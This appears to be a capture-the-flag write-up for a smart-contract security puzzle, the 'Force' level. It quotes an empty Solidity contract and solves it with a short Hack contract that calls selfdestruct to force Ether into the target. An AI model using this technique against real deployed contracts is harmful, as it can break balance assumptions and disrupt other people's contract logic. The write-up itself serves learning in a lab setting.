# Some contracts will simply not take your money  ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

  Things that might help:

* Fallback methods
* Sometimes the best way to attack a contract is with another contract.
* See the "?" page above, section "Beyond the console"

pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

## Solution

1. Get a new instance of the contract
2. We can use the selfdestruct() method. Smart contracts can receive Ether from other contracts as a result of a selfdestruct() call.

```
contract Hack { 
  constructor(address payable _force) payable {
    selfdestruct(_force);
  }
}
```
